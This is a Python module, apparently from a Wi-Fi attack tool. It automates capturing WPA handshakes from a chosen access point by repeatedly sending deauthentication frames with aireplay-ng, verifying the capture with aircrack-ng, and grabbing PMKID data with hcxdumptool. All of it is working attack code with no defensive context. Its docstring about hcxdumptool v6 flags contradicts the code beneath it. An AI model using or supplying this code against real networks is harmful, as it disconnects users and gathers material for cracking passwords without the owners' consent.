import re
import subprocess
import time
from pathlib import Path
from typing import List, Optional

from .scanner import set_channel
from .utils import ToolError, is_bssid, parse_handshake_count, run, run_quiet, tool_version


def _deauth(iface: str, bssid: str, client: Optional[str], count: int = 8) -> None:
    cmd = ["aireplay-ng", "--deauth", str(count), "-a", bssid]
    if client:
        cmd += ["-c", client]
    cmd.append(iface)
    run_quiet(cmd)


def _handshake_ok(cap: Path, bssid: str) -> bool:
    if not cap.exists() or cap.stat().st_size == 0:
        return False
    out = run(["aircrack-ng", "-b", bssid, str(cap)]).stdout or ""
    return parse_handshake_count(out) > 0


def _start(cmd: List[str]) -> subprocess.Popen:
    try:
        return subprocess.Popen(
            cmd,
            stdin=subprocess.DEVNULL,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )
    except FileNotFoundError as e:
        raise ToolError(str(e)) from e


def capture_handshake(
    iface: str,
    bssid: str,
    channel: int,
    outdir: Path,
    wait_seconds: int = 120,
    client: Optional[str] = None,
) -> Path:
    if not is_bssid(bssid):
        raise ToolError(f"invalid bssid: {bssid}")

    outdir.mkdir(parents=True, exist_ok=True)
    prefix = outdir / f"hs_{bssid.replace(':', '').lower()}"
    set_channel(iface, channel)

    proc = _start([
        "airodump-ng",
        "--bssid", bssid,
        "--channel", str(channel),
        "--write-interval", "1",
        "--output-format", "pcap",
        "-w", str(prefix),
        iface,
    ])

    deadline = time.time() + wait_seconds
    cap_file: Optional[Path] = None

    try:
        while time.time() < deadline:
            time.sleep(3)
            for cand in sorted(outdir.glob(f"{prefix.name}-*.cap")) + sorted(outdir.glob(f"{prefix.name}-*.pcap")):
                if _handshake_ok(cand, bssid):
                    cap_file = cand
                    break
            if cap_file:
                break
            _deauth(iface, bssid, client, count=8)
    finally:
        proc.terminate()
        try:
            proc.wait(timeout=5)
        except Exception:
            proc.kill()

    if cap_file is None:
        candidates = sorted(outdir.glob(f"{prefix.name}-*.cap")) + sorted(outdir.glob(f"{prefix.name}-*.pcap"))
        if candidates and _handshake_ok(candidates[-1], bssid):
            cap_file = candidates[-1]

    if cap_file is None:
        raise ToolError("no valid 4-way handshake captured within wait window")
    return cap_file


def _hcxdumptool_flags(iface: str, pcapng: Path) -> List[str]:
    """hcxdumptool v6.x dropped --enable_status; v5.x needs it. Probe the binary."""
    ver = tool_version("hcxdumptool")
    base = ["hcxdumptool", "-i", iface, "-o", str(pcapng)]
    if ver.startswith("6.") or ver.startswith("v6."):
        # v6 uses --enable_status=1 still but strips deprecated options silently
        return base + ["--enable_status=1"]
    if ver.startswith("7.") or ver.startswith("v7."):
        return base
    # unknown version — safe defaults
    return base


def capture_pmkid(iface: str, outdir: Path, timeout_seconds: int = 120) -> Path:
    outdir.mkdir(parents=True, exist_ok=True)
    prefix = outdir / f"pmkid_{int(time.time())}"
    pcapng = prefix.with_suffix(".pcapng")

    cmd = _hcxdumptool_flags(iface, pcapng)
    proc = _start(cmd)

    try:
        proc.wait(timeout=timeout_seconds)
    except subprocess.TimeoutExpired:
        proc.terminate()
        try:
            proc.wait(timeout=5)
        except subprocess.TimeoutExpired:
            proc.kill()

    if not pcapng.exists() or pcapng.stat().st_size == 0:
        raise ToolError("hcxdumptool produced no pcapng (check adapter, channel, and hcxdumptool version)")
    return pcapng
